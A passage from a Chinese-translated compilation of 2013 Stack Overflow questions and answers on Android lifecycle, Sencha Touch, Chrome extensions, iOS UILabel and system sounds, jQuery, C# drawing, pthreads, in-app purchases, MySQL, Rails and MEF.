02-12 18:34:01.899: E/activity(22605): onStart called
02-12 18:34:01.909: D/activity(22605): onResumeCalled
02-12 18:34:20.409: D/activity(22605): onPauseCalled
02-12 18:34:20.409: E/activity(22605): onStop called
02-12 18:34:20.409: E/activity(22605): onDestroy called
02-12 18:34:20.609: E/activity(22605): onCreate called
02-12 18:34:20.609: E/activity(22605): onStart called
02-12 18:34:20.609: D/activity(22605): onResumeCalled
02-12 18:34:20.769: D/activity(22605): onWindowFocusChanged called with focus = true 
```

onWindowFocusChanged(false) 从不调用，之前链接中描述的解决方案不起作用。

此外，我有点担心在设备锁定/解锁时会有很多 onDestroy/onCreate 调用。据我了解，这是因为活动将其方向从横向（用于游戏）更改为纵向（用于设备锁定屏幕）并返回到横向。但是对于这样的破坏活动，没有时间调用 onWindowFocusChanged(false)。

所以，我的问题：

1.  如何解决锁定屏幕上播放声音的原始问题？
2.  是否可以不多次调用 onDestroy/onCreate ？

感谢您的关注。

**UPD**我已经从[这里](http://www.giderosmobile.com/forum/discussion/comment/12047#Comment_12047)实现了解决方案，并且在我的设备上一切正常，但我不确定这个解决方案是否完全正确。在第一个链接中：

> 如果设备自行入睡，或者如果用户锁定手机然后立即解锁，您的应用可能根本不会收到任何焦点更改消息。

所以，我不确定在所有情况下都会调用 onWindowFocusChanged(true)。这是可能的解决方案吗？

**UPD 2**关于多次调用 onDestroy/onCreate ：正如在 google Activity API 中关于配置更改所写的那样，我试图拦截显示方向的配置更改，但它对我来说效果不佳。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:16:02.960

对于第一个答案：您可以考虑处理lonk /解锁屏幕事件的选项，而不是处理焦点更改：android.intent.action.SCREEN_ON，android.intent.action.SCREEN_OFF。

这样您就可以注意到手机何时锁定/解锁并处理声音问题。

关于第二个问题，这可能与方向配置更改有关。可能您没有像 Android 预期的那样处理事件，它试图扭转局面。但这一个我不知道如何解决。

# extjs - 更改 Navigationview 提供的默认标题栏的标题

> ID：14832044
> 
> 赞同：2
> 
> 时间：2013-02-12T11:57:54.093
> 
> 标签：extjs, sencha-touch-2

我正在尝试更改 NavigationView 提供的标题栏的默认标题？或者，禁用使用 NavigationView 时提供的整个默认标题栏？

![图片](../Images/aaa012c05ab26a75e311a073ef83160d.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T17:07:12.927

您可以使用[navigationBar](http://docs.sencha.com/touch/2-1/#!/api/Ext.navigation.View-cfg-navigationBar)配置来自定义或隐藏默认的 titleBar。

```
navigationBar: {
    hidden: true
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-12T07:22:27.040

**隐藏导航栏**

```
 Ext.getCmp('idNavigationBar').setHidden(true);
or 
Ext.getCmp('idNavigationBar').hide();
or
Ext.Componentquery.Query('#idNavigationBar')[0].hide(); 
```

**并使其可见**

```
 Ext.getCmp('idNavigationBar').setHidden(false);
or
Ext.getCmp('idNavigationBar').show();
or
Ext.Componentquery.Query('#idNavigationBar')[0].show(); 
```

# google-chrome - Chrome 扩展仅适用于一个 URL

> ID：14832048
> 
> 赞同：-1
> 
> 时间：2013-02-12T11:58:04.420
> 
> 标签：google-chrome, iframe, google-chrome-extension

我正在创建一个 chrome 扩展我用 1.background.js 2.icon.png 3.icon2.png 4.manifest.json 5.myscript.js 创建了一个目录

我的 manifest.json 代码是

```
{
  "manifest_version": 2,

  "name": "One-click Kittens",
  "description": "This extension demonstrates a browser action with kittens.",
  "version": "1.0",
"background": {
    "scripts": ["background.js"]
  },

  "permissions": [ "storage"],
"content_scripts": [
    {
      "matches": ["http://*/*"],
      "js": ["myscript.js"]
    }
  ],
  "browser_action": {
    "default_icon": "icon.png"
  }
} 
```

1.  作为内容脚本的 myscript.js 的代码是

    document.body.innerHTML=''+document.body.innerHTML+'' ; var iframe = document.getElementById("frame1"); 函数 addevent(){ chrome.extension.sendMessage({change: "icon"}, function(response) { console.log(response.resp); });

    ```
     }
        iframe.onload = function(){

        var iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
        if(iframeDocument != null)
        {var bb=iframeDocument.getElementById('mybutton');
        if(bb != null)
        {
        bb.addEventListener("click",addingevent,false)
        alert("Hello World");

        }}

        } 
    ```

background.js 的代码是

```
chrome.extension.onMessage.addListener(
  function(request, sender, sendResponse) {

    console.log("from a content script:from the extension");

chrome.storage.local.get("icon",function(val){

if(val.icon == "icon1")
{chrome.browserAction.setIcon({"path" :"icon2.png"},function(){});
chrome.storage.local.set({"icon":"icon"},function(){});
}
else
{chrome.browserAction.setIcon({"path" :"icon.png"},function(){});

chrome.storage.local.set({"icon":"icon1"},function(){});

}

});

sendResponse({resp: "success"});

  }); 
```

此扩展的目的是当用户单击从 url [http://onemoredemo.appspot.com/](http://onemoredemo.appspot.com/)加载的框架中的按钮时， 图标应在 icon.png 和 icon2.png 之间切换

[当我将它加载到带有 url http://onemoredemo.appspot.com/](http://onemoredemo.appspot.com/)的网页中时，此扩展程序完美运行，创建了框架，当我单击按钮时它正在更改图标，但是当我打开 url stackoverflow.com 时，框架被创建并显示按钮在其中，但是当我单击按钮图标保持不变时，我希望该图标将被更改而不管 url 为什么它在其他 url 中没有改变？请说明原因

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:26:27.787

There are multiple issues

*   Do you expect a DOM Element with id `frame1` to exist on [http://stackoverflow.com](http://stackoverflow.com) document.getElementById("frame1");
*   What is significance of `document.body.innerHTML=''+document.body.innerHTML+'';`?

# ios - UILabel如何收紧字母间距

> ID：14832052
> 
> 赞同：10
> 
> 时间：2013-02-12T11:58:09.913
> 
> 标签：ios, uilabel

我想知道如何以编程方式“收紧字母间距”？

此选项可用于在 xib 文件中制作的 UILabel，有时非常方便。

我知道以前有人问过这个问题，但我没有看到在界面生成器中提到这个蜜蜂的答案，所以我很好奇......

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-02-12T12:18:10.473

您可能正在寻找这个：

```
@property(nonatomic) BOOL adjustsLetterSpacingToFitWidth 
```

`UILabel`新的财产`iOS6`。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2017-03-31T08:21:33.037

您可能想要使用 UILabel 属性：

```
allowsDefaultTighteningForTruncation: Bool 
```

并将其设置为`true`. （默认为`false`）

根据苹果文档：

> 当此属性设置为 true 时，标签会在允许发生任何截断之前收紧其文本的字符间距。标签根据字体、当前线宽、换行方式和其他相关信息自动确定最大收紧量。

[https://developer.apple.com/reference/uikit/uilabel/1620533-allowsdefaulttighteningfortrunca](https://developer.apple.com/reference/uikit/uilabel/1620533-allowsdefaulttighteningfortrunca)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-06-16T20:29:14.700

`adjustsLetterSpacingToFitWidth`自 iOS 7 起已[弃用](https://developer.apple.com/library/ios/documentation/UIKit/Reference/UILabel_Class/#//apple_ref/occ/instp/UILabel/adjustsLetterSpacingToFitWidth)。

您现在（从 iOS 8 开始）可能想要执行以下操作：

```
NSAttributedString *as = 
[[NSAttributedString alloc] initWithString:@"Kerninating all the strings"
                                attributes:@{NSKernAttributeName : @(-2.0)}];
label.attributedText = as; 
```

# vba - 不要将通过 VBA 所做的更改添加到撤消历史记录

> ID：14832053
> 
> 赞同：5
> 
> 时间：2013-02-12T11:58:20.327
> 
> 标签：vba, undo, word-2007

我有一组 Word 宏，用于格式化从外部源发送到的文档。通常对文档进行了很多更改，所有这些更改都记录在撤消历史记录中，这是我不想要的。

有没有办法不将所有这些更改添加到撤消历史记录中，而只是添加一个撤消操作来撤消宏所做的所有事情？谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-12-13T18:53:17.687

这不适用于 Word 2007 或更早版本。UndoRecord 对象是在 Word 2010 中添加的，它允许您将 VBA 中的操作“聚集”到单个 UndoRecord 中，可以为其分配 Undo 列表的自定义“标签”。撤消操作可以嵌套在各个级别。可以创建多个 UndoRecord 对象。MSDN 文档中提供了更多信息

[https://msdn.microsoft.com/en-us/library/office/ff821168(v=office.14).aspx](https://msdn.microsoft.com/en-us/library/office/ff821168(v=office.14).aspx)

# iphone - 在 iOS 中显示默认铃声列表

> ID：14832055
> 
> 赞同：4
> 
> 时间：2013-02-12T11:58:23.407
> 
> 标签：iphone, ios, ringtone

我只想显示默认铃声列表，以允许用户选择一个设置为新通知的铃声。那可能吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-12T12:50:23.543

```
#import <MediaPlayer/MediaPlayer.h>

- (IBAction) AddMusicOrShowMusic: (id) sender
{
    MPMediaPickerController *picker =
    [[MPMediaPickerController alloc] initWithMediaTypes: MPMediaTypeMusic];
    picker.delegate = self;
    picker.allowsPickingMultipleItems   = NO;
    picker.prompt                       = NSLocalizedString (@"Add songs to play", "Prompt in media item picker");
    [[UIApplication sharedApplication] setStatusBarStyle: UIStatusBarStyleDefault animated: YES];
    [self presentViewController:picker animated:YES completion:NULL];
    [picker release];
}

- (void) mediaPicker: (MPMediaPickerController *) mediaPicker didPickMediaItems: (MPMediaItemCollection *) mediaItemCollection
{
    [self dismissViewControllerAnimated:YES completion:nil];
    item = [[mediaItemCollection items] objectAtIndex:0];
       NSURL *url = [item valueForProperty:MPMediaItemPropertyAssetURL];
    NSLog(@"url : %@",url);
}
- (void) mediaPickerDidCancel: (MPMediaPickerController *) mediaPicker
{
    [self dismissViewControllerAnimated:YES completion:nil];
    [[UIApplication sharedApplication] setStatusBarStyle: UIStatusBarStyleBlackOpaque animated: YES];
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-12T12:12:15.913

利用`AudioServicesPlaySystemSound`

```
void AudioServicesPlaySystemSound (
   SystemSoundID inSystemSoundID
); 
```

systemSoundID 的列表是：

```
1000    new-mail.caf    new-mail.caf    MailReceived    
1001    mail-sent.caf   mail-sent.caf   MailSent    
1002    Voicemail.caf   Voicemail.caf   VoicemailReceived   
1003    ReceivedMessage.caf ReceivedMessage.caf SMSReceived 
1004    SentMessage.caf SentMessage.caf SMSSent 
1005    alarm.caf   sq_alarm.caf    CalendarAlert   
1006    low_power.caf   low_power.caf   LowPower    
1007    sms-received1.caf   sms-received1.caf   SMSReceived_Alert   
1008    sms-received2.caf   sms-received2.caf   SMSReceived_Alert   
1009    sms-received3.caf   sms-received3.caf   SMSReceived_Alert   
1010    sms-received4.caf   sms-received4.caf   SMSReceived_Alert   
1011    -   -   SMSReceived_Vibrate 
1012    sms-received1.caf   sms-received1.caf   SMSReceived_Alert   
1013    sms-received5.caf   sms-received5.caf   SMSReceived_Alert   
1014    sms-received6.caf   sms-received6.caf   SMSReceived_Alert   
1015    Voicemail.caf   Voicemail.caf   -   Available since 2.1
1016    tweet_sent.caf  tweet_sent.caf  SMSSent Available since 5.0
1020    Anticipate.caf  Anticipate.caf  SMSReceived_Alert   Available since 4.2
1021    Bloom.caf   Bloom.caf   SMSReceived_Alert   Available since 4.2
1022    Calypso.caf Calypso.caf SMSReceived_Alert   Available since 4.2
1023    Choo_Choo.caf   Choo_Choo.caf   SMSReceived_Alert   Available since 4.2
1024    Descent.caf Descent.caf SMSReceived_Alert   Available since 4.2
1025    Fanfare.caf Fanfare.caf SMSReceived_Alert   Available since 4.2
1026    Ladder.caf  Ladder.caf  SMSReceived_Alert   Available since 4.2
1027    Minuet.caf  Minuet.caf  SMSReceived_Alert   Available since 4.2
1028    News_Flash.caf  News_Flash.caf  SMSReceived_Alert   Available since 4.2
1029    Noir.caf    Noir.caf    SMSReceived_Alert   Available since 4.2
1030    Sherwood_Forest.caf Sherwood_Forest.caf SMSReceived_Alert   Available since 4.2
1031    Spell.caf   Spell.caf   SMSReceived_Alert   Available since 4.2
1032    Suspense.caf    Suspense.caf    SMSReceived_Alert   Available since 4.2
1033    Telegraph.caf   Telegraph.caf   SMSReceived_Alert   Available since 4.2
1034    Tiptoes.caf Tiptoes.caf SMSReceived_Alert   Available since 4.2
1035    Typewriters.caf Typewriters.caf SMSReceived_Alert   Available since 4.2
1036    Update.caf  Update.caf  SMSReceived_Alert   Available since 4.2
1050    ussd.caf    ussd.caf    USSDAlert   
1051    SIMToolkitCallDropped.caf   SIMToolkitCallDropped.caf   SIMToolkitTone  
1052    SIMToolkitGeneralBeep.caf   SIMToolkitGeneralBeep.caf   SIMToolkitTone  
1053    SIMToolkitNegativeACK.caf   SIMToolkitNegativeACK.caf   SIMToolkitTone  
1054    SIMToolkitPositiveACK.caf   SIMToolkitPositiveACK.caf   SIMToolkitTone  
1055    SIMToolkitSMS.caf   SIMToolkitSMS.caf   SIMToolkitTone  
1057    Tink.caf    Tink.caf    PINKeyPressed   
1070    ct-busy.caf ct-busy.caf AudioToneBusy   There was no category for this sound before 4.0.
1071    ct-congestion.caf   ct-congestion.caf   AudioToneCongestion There was no category for this sound before 4.0.
1072    ct-path-ack.caf ct-path-ack.caf AudioTonePathAcknowledge    There was no category for this sound before 4.0.
1073    ct-error.caf    ct-error.caf    AudioToneError  There was no category for this sound before 4.0.
1074    ct-call-waiting.caf ct-call-waiting.caf AudioToneCallWaiting    There was no category for this sound before 4.0.
1075    ct-keytone2.caf ct-keytone2.caf AudioToneKey2   There was no category for this sound before 4.0.
1100    lock.caf    sq_lock.caf ScreenLocked    
1101    unlock.caf  sq_lock.caf ScreenUnlocked  
1102    -   -   FailedUnlock    
1103    Tink.caf    sq_tock.caf KeyPressed  
1104    Tock.caf    sq_tock.caf KeyPressed  
1105    Tock.caf    sq_tock.caf KeyPressed  
1106    beep-beep.caf   sq_beep-beep.caf    ConnectedToPower    
1107    RingerChanged.caf   RingerChanged.caf   RingerSwitchIndication  
1108    photoShutter.caf    photoShutter.caf    CameraShutter   
1109    shake.caf   shake.caf   ShakeToShuffle  Available since 3.0
1110    jbl_begin.caf   jbl_begin.caf   JBL_Begin   Available since 3.0
1111    jbl_confirm.caf jbl_confirm.caf JBL_Confirm Available since 3.0
1112    jbl_cancel.caf  jbl_cancel.caf  JBL_Cancel  Available since 3.0
1113    begin_record.caf    begin_record.caf    BeginRecording  Available since 3.0
1114    end_record.caf  end_record.caf  EndRecording    Available since 3.0
1115    jbl_ambiguous.caf   jbl_ambiguous.caf   JBL_Ambiguous   Available since 3.0
1116    jbl_no_match.caf    jbl_no_match.caf    JBL_NoMatch Available since 3.0
1117    begin_video_record.caf  begin_video_record.caf  BeginVideoRecording Available since 3.0
1118    end_video_record.caf    end_video_record.caf    EndVideoRecording   Available since 3.0
1150    vc~invitation-accepted.caf  vc~invitation-accepted.caf  VCInvitationAccepted    Available since 4.0
1151    vc~ringing.caf  vc~ringing.caf  VCRinging   Available since 4.0
1152    vc~ended.caf    vc~ended.caf    VCEnded Available since 4.0
1153    ct-call-waiting.caf ct-call-waiting.caf VCCallWaiting   Available since 4.1
1154    vc~ringing.caf  vc~ringing.caf  VCCallUpgrade   Available since 4.1
1200    dtmf-0.caf  dtmf-0.caf  TouchTone   
1201    dtmf-1.caf  dtmf-1.caf  TouchTone   
1202    dtmf-2.caf  dtmf-2.caf  TouchTone   
1203    dtmf-3.caf  dtmf-3.caf  TouchTone   
1204    dtmf-4.caf  dtmf-4.caf  TouchTone   
1205    dtmf-5.caf  dtmf-5.caf  TouchTone   
1206    dtmf-6.caf  dtmf-6.caf  TouchTone   
1207    dtmf-7.caf  dtmf-7.caf  TouchTone   
1208    dtmf-8.caf  dtmf-8.caf  TouchTone   
1209    dtmf-9.caf  dtmf-9.caf  TouchTone   
1210    dtmf-star.caf   dtmf-star.caf   TouchTone   
1211    dtmf-pound.caf  dtmf-pound.caf  TouchTone   
1254    long_low_short_high.caf long_low_short_high.caf Headset_StartCall   
1255    short_double_high.caf   short_double_high.caf   Headset_Redial  
1256    short_low_high.caf  short_low_high.caf  Headset_AnswerCall  
1257    short_double_low.caf    short_double_low.caf    Headset_EndCall 
1258    short_double_low.caf    short_double_low.caf    Headset_CallWaitingActions  
1259    middle_9_short_double_low.caf   middle_9_short_double_low.caf   Headset_TransitionEnd   
1300    Voicemail.caf   Voicemail.caf   SystemSoundPreview  
1301    ReceivedMessage.caf ReceivedMessage.caf SystemSoundPreview  
1302    new-mail.caf    new-mail.caf    SystemSoundPreview  
1303    mail-sent.caf   mail-sent.caf   SystemSoundPreview  
1304    alarm.caf   sq_alarm.caf    SystemSoundPreview  
1305    lock.caf    sq_lock.caf SystemSoundPreview  
1306    Tock.caf    sq_tock.caf KeyPressClickPreview    The category was SystemSoundPreview before 3.2.
1307    sms-received1.caf   sms-received1.caf   SMSReceived_Selection   
1308    sms-received2.caf   sms-received2.caf   SMSReceived_Selection   
1309    sms-received3.caf   sms-received3.caf   SMSReceived_Selection   
1310    sms-received4.caf   sms-received4.caf   SMSReceived_Selection   
1311    -   -   SMSReceived_Vibrate 
1312    sms-received1.caf   sms-received1.caf   SMSReceived_Selection   
1313    sms-received5.caf   sms-received5.caf   SMSReceived_Selection   
1314    sms-received6.caf   sms-received6.caf   SMSReceived_Selection   
1315    Voicemail.caf   Voicemail.caf   SystemSoundPreview  Available since 2.1
1320    Anticipate.caf  Anticipate.caf  SMSReceived_Selection   Available since 4.2
1321    Bloom.caf   Bloom.caf   SMSReceived_Selection   Available since 4.2
1322    Calypso.caf Calypso.caf SMSReceived_Selection   Available since 4.2
1323    Choo_Choo.caf   Choo_Choo.caf   SMSReceived_Selection   Available since 4.2
1324    Descent.caf Descent.caf SMSReceived_Selection   Available since 4.2
1325    Fanfare.caf Fanfare.caf SMSReceived_Selection   Available since 4.2
1326    Ladder.caf  Ladder.caf  SMSReceived_Selection   Available since 4.2
1327    Minuet.caf  Minuet.caf  SMSReceived_Selection   Available since 4.2
1328    News_Flash.caf  News_Flash.caf  SMSReceived_Selection   Available since 4.2
1329    Noir.caf    Noir.caf    SMSReceived_Selection   Available since 4.2
1330    Sherwood_Forest.caf Sherwood_Forest.caf SMSReceived_Selection   Available since 4.2
1331    Spell.caf   Spell.caf   SMSReceived_Selection   Available since 4.2
1332    Suspense.caf    Suspense.caf    SMSReceived_Selection   Available since 4.2
1333    Telegraph.caf   Telegraph.caf   SMSReceived_Selection   Available since 4.2
1334    Tiptoes.caf Tiptoes.caf SMSReceived_Selection   Available since 4.2
1335    Typewriters.caf Typewriters.caf SMSReceived_Selection   Available since 4.2
1336    Update.caf  Update.caf  SMSReceived_Selection   Available since 4.2
1350    -   -   RingerVibeChanged   
1351    -   -   SilentVibeChanged   
4095    -   -   Vibrate There was no category for this sound before 2.2. 
```

# javascript - 如何使 jQuery filter(':contains("XXX")') 不区分大小写？

> ID：14832056
> 
> 赞同：-1
> 
> 时间：2013-02-12T11:58:23.413
> 
> 标签：javascript, jquery

我正在使用 jQuery 1.7.1。我需要使 filter(':contains("XXX")') 选择器不区分大小写。我已经尝试过[了](http://css-tricks.com/snippets/jquery/make-jquery-contains-case-insensitive/)，[这](https://stackoverflow.com/questions/187537/is-there-a-case-insensitive-jquery-contains-selector)没有运气意味着它不起作用。准确地说， $('div:contains') 有效，但 filter(':contain') 无效

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-12T11:59:29.560

使用正则表达式和过滤函数：

```
yourJquerySet.filter(function(){ return $(this).text().match(/XXX/i) }) 
```

如果您的字符串`XXX`是动态提供的，请使用

```
var r = new RegExp(str, 'i'); 
var outputset = inputset.filter(function(){ return $(this).text().match(r) }) 
```

# c# - 如何在 C# 中更快地处理 MouseMove 事件

> ID：14832059
> 
> 赞同：3
> 
> 时间：2013-02-12T11:58:26.277
> 
> 标签：c#, .net, events, mouse, picturebox

我目前正在尝试在图片框中显示的图像上绘制一些东西。我正在为鼠标活动使用事件处理程序：onMouseUp、onMouseMove 和 onMouseDown。

```
private void onMouseDown(object sender, MouseEventArgs e)
    {
        mouseDown = true;
    }

    private void onMouseMove(object sender, MouseEventArgs e)
    {
        if (mouseDown)
        {
            using (Graphics g = pictureBox.CreateGraphics())
            {
                g.FillEllipse(Brushes.Black, e.X - size, e.Y - size, size * 2, size * 2);
            }
        }
    }
private void onMouseUp(object sender, MouseEventArgs e)
    {
        mouseDown = false;

        using (Graphics g = pictureBox.CreateGraphics())
        {
            g.FillEllipse(Brushes.Black, e.X - size, e.Y - size, size * 2, size * 2); //just in case user just clicks instead of move the mouse
        }
    } 
```

我正在尝试模拟当鼠标在图片框上移动时绘制指定大小（半径）的圆圈的画笔工具。它在缓慢移动时效果很好，但当移动速度更快时，pictureBox 似乎只捕捉到一些事件，并且很多圆圈被跳过而不被绘制。尤其是半径很小的时候。

我该怎么做才能让它更快更顺畅？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-12T12:02:39.773

移动鼠标时，您不会`MouseMove`为鼠标指针经过的每个像素获得一个事件。您将以相当一致的时间间隔获得它们，因此鼠标移动得越快，您获得的点就越远。这个特殊的细节你无能为力。

您需要做的是存储收到的最后一个点的位置，并在最后一个点和新点之间的每个点绘制一个椭圆。

# c - 高性能计算pthread参数 - c++

> ID：14832062
> 
> 赞同：2
> 
> 时间：2013-02-12T11:58:29.687
> 
> 标签：c, multithreading, performance, pthreads, posix

我正在做一个项目，我需要使用 pthread (C++) 使用多个线程。我有个问题：

当我想在该线程中进行一些高性能计算而没有太多其他线程中断它时，最好的 pthread 参数配置设置是什么？

目前我正在使用这样的东西：

```
pthread_t thread;

struct sched_param param;
int sched = SCHED_FIFO;
memset(&param, 0, sizeof(sched_param));

// Now I set priority to max value (sched_get_priority_max() returns that value)
param.sched_priority = sched_get_priority_max();

// Create my thread
pthread_create(&thread, NULL, (void *) &hard_number_crunching, (void *) &structure_passed_to_thread);

// finally I set parameters to thread
pthread_setschedparam(&thread, sched, &param); 
```

我在 SCHED_FIFO 和 SCHED_RR 之间切换“int sched”，但这对我没有多大帮助。是否可以强制该线程在 CPU 上运行比现在更长的时间？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T13:56:46.113

如果您为每个内核创建一个线程，您可能希望设置线程的亲和性以防止它在内核之间漫游。这通常通过确保每个线程保持接近其缓存数据来提高性能。看：

```
int sched_setaffinity(pid_t pid,size_t cpusetsize,cpu_set_t *mask); 
```

注意：如果您创建的线程多于核心，则不应设置关联！这可能会导致各种疯狂的事情发生，比如死锁。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:56:11.630

假设您的线程将花费 X 个周期。不管优先级是什么，或者系统在做什么，它仍然需要 X 个周期。如果系统不忙于做其他事情，您的线程将几乎连续运行直到它完成。如果系统很忙，你的线程将被停止，甚至可能频繁地停止，让其他事情运行。最终，您的线程仍将获得其 X 个周期。请注意，出于您的目的，这里有两种类型的优先级...线程优先级（您的一个线程的优先级与其他线程的优先级）和进程优先级（您的进程/程序的优先级与其他线程的优先级）进程/程序/操作系统）。您正在设置线程优先级。您是否有其他具有相同或更高优先级的线程与该线程竞争？是否有更高优先级的系统进程与您的竞争？如果答案是否定的，那么您几乎可以自己获得 CPU。另请注意，如果您有多个处理器和/或内核，您的线程可能无法在多个处理器上运行良好，因此如果您没有很好地划分任务，您的整体系统处理可能不会 100%。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T08:05:46.937

两者都是 zr。并标记答案帮助了我。我还找到了一种为单个线程设置亲和力的方法。检查此链接以了解如何：[pthread_attr_setaffinity_np()](http://www.kernel.org/doc/man-pages/online/pages/man3/pthread_attr_setaffinity_np.3.html)

感谢所有帮助过的人。

# ios - 如何在 ios 上查看已购买的 InApp 购买

> ID：14832064
> 
> 赞同：2
> 
> 时间：2013-02-12T11:58:36.343
> 
> 标签：ios, ios5, in-app-purchase

我正在使用 InApp 购买，所以我已经实现了一个工作模型，我已经参考了这个

链接 [http://xcodenoobies.blogspot.in/2012/04/implementing-inapp-purchase-in-xcode.html](http://xcodenoobies.blogspot.in/2012/04/implementing-inapp-purchase-in-xcode.html)。

在这里，当用户购买商品时，我将一些值存储在**KeyChain**中，并与该值进行交叉检查以确认用户已购买该商品，如果没有，我将要求用户购买该商品。

这可行，但是我有**4个产品**可供购买，可以单独购买**，**所以我想创建不同**的KeyChain实例**并为这4个产品存储不同的密码并交叉检查，但keyChain只能保存一个用户名和密码。

所以我想知道什么可以替代这个**。NSUserdefaults** 也不起作用，因为它与 App 捆绑包绑定，每当用户删除应用程序时，数据都会丢失，因此会要求他再次购买。

问候兰吉特

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:10:49.493

如果您要添加可恢复的应用内购买（不可更新订阅、免费订阅或非消耗性产品），那么 Store Kit API 已经为您提供了“恢复交易”功能：http: [//developer.apple。 com/library/ios/#documentation/NetworkingInternet/Conceptual/StoreKitGuide/MakingaPurchase/MakingaPurchase.html](http://developer.apple.com/library/ios/#documentation/NetworkingInternet/Conceptual/StoreKitGuide/MakingaPurchase/MakingaPurchase.html)

在您的 UI 中，您需要在调用该`restoreCompletedTransactions`方法的产品屏幕上添加一个“恢复购买”按钮。这很重要，因为如果您不提供此按钮，Apple 可能会拒绝您的应用程序。

# mysql - 同时合并和连接数据

> ID：14832069
> 
> 赞同：1
> 
> 时间：2013-02-12T11:58:51.177
> 
> 标签：mysql, concat

我想做的是以下几点：我有一个包含 3 个 cols 的数据库，它们共同形成一个独特的组合。我将这个组合提取到一个新表中（表 1）。现在我想将单独列中存在的数据与唯一的 3 col 组合相匹配。例如：

```
cat dog day twenty two
cat dog day twenty eleven
cat dog morning eleven ten 
```

应该成为

```
cat dog day "twenty=two&twenty=eleven"
cat dog morning "eleven=ten" 
```

作为额外的评论，我应该补充一点，我无法预测应该连接多少项目。

我尝试了以下方法：字符串字段应该使用 val3、val4 和 val5 的唯一组合的所有结果的 concat 进行更新。

```
UPDATE `db`.`table1` , `db`.`table2`
SET
string = 
(
SELECT group_concat(value1,'=',value2,'&') from table2
group by (val3,val4,val5)
)
WHERE 
(
`table1`.`val3`=`table2`.`val3` AND
`table1`.`val4=table2`.`val4` AND
`table1`.`val5=table2`.`val5`)
; 
```

一个提示或提示将不胜感激。提前致谢。供参考：[解决方案](https://stackoverflow.com/questions/14699703/loop-through-all-rows-and-concat-unique-values-in-sql-table)对我不起作用，因为我正在使用 mySQL，我需要将 2 个 col 匹配在一起。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:14:36.093

给定这个数据结构：

```
CREATE TABLE `dummy` (
  `col1` varchar(20),
  `col2` varchar(20),
  `key` varchar(20) DEFAULT NULL,
  `val` varchar(20) DEFAULT NULL
); 
```

以下查询将为您提供您所要求的内容：

```
select col1, col2, group_concat(concat(`key`,'=', `val`) SEPARATOR '&') from dummy group by col1, col2 
```

# ruby-on-rails - 无法在 Rails 中保存关联的模型 ID

> ID：14832070
> 
> 赞同：0
> 
> 时间：2013-02-12T11:58:52.223
> 
> 标签：ruby-on-rails, associations, has-many, belongs-to

我已经设置了模型生产者和产品。当我想创建一个新产品时，我可以在表单中从列表中选择生产者。这是代码：

```
<%= select("producer", "producer_id", Producer.all.collect {|t| [ t.name, t.id ] }, {:prompt => 'Select producer'})%> 
```

它工作正常，但是当我想保存创建的产品时，它显示`producer_id`不能为空白，这是由我创建的验证引起的。我已将列设置`producer_id`为 Product 表，创建关联，以及我被告知的所有内容。

这是我的代码：

**产品控制器**

```
def new
@product = Product.new

respond_to do |format|
  format.html # new.html.erb
  format.json { render json: @product }
end 

def create
   @product = Product.new(params[:product])
end 
```

**产品型号**

```
belongs_to :producer 
```

**生产者模型**

```
has_many :products 
```

我希望有人能帮忙！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:49:14.320

问题是在您的控制器中您引用了 params[:product]，但在您看来，您使用的是“生产者”。将 select("producer".. 更改为 select("product" ，它将正常工作。

```
def create
   @product = Product.new(params[:product])
end

<%= select("producer", "producer_id", Producer.all.collect {|t| [ t.name, t.id ] }, {:prompt => 'Select producer'})%> 
```

# c# - 如何从 MEF 导入创建新对象

> ID：14832072
> 
> 赞同：4
> 
> 时间：2013-02-12T11:59:09.640
> 
> 标签：c#, mef

我对 MEF 有点困惑，我以为我已经开始理解它，但似乎我并不完全在那里。

所以，我有一个我想读入的 XML 测试步骤列表。这个想法是主应用程序在运行时对类型一无所知。

```
<TestSteps>
    <TestRunner xsi:type="SimulateDc" Measurement="54"/>
    <TestRunner xsi:type="MeasureDc" Output="1"/>
</TestSteps> 
```

所以我有一个带有静态“结果”类的基类型，它允许我保存信息以在步骤之间传递（`Output`上面 XML 中的属性）。这里的测试处理程序由 MEF 导出，我在运行时将它们读入，然后将`Type`它们传递给 XML 序列化程序以创建处理程序列表。这一切都有效，我得到了一个测试运行者的列表。我在这里对每种类型都有一个`DataTemplate`导出，所以当我使用内容控件时，它知道如何绘制自己。一切似乎都很好，但是我认为我的思维过程出错了。

一个问题是我现在想将导入的处理程序绑定到某些硬件。硬件处理例程旨在由更多 MEF 导入处理

因此，使用这样的界面：

```
public interface IMeasureHW
{
    double Measure();
} 
```

然后使用这个：

```
[Export("MeasureDc", typeof(IMeasureHW))]
public class MeasureDcHW : IMeasureHW
{
    public double Measure()
    {
        return 54.0;
    }
} 
```

然后在我的一个测试处理程序中，我这样做了：

```
[Import("MeasureDc", typeof(IMeasureHW))]
IMeasureHW hardware { get; set; } 
```

我的导入是这样进行的：

```
protected override void OnStartup(StartupEventArgs e)
{
    base.OnStartup(e);

    var catalog = new AggregateCatalog();
    catalog.Catalogs.Add(new DirectoryCatalog("."));
    catalog.Catalogs.Add(new AssemblyCatalog(Assembly.GetExecutingAssembly()));

    _container = new CompositionContainer(catalog);

    _container.ComposeParts(this);

    MainWindow.Show();
} 
```

但是，我猜测上面的 XML 序列化并`Type`像我一样使用这些信息肯定意味着导入将为空，因此暗示我的设计思维模式是错误的。

我确实设法通过导出 CompositionContainer 让它工作，然后在加载 XML 之后我能够做到这一点：

```
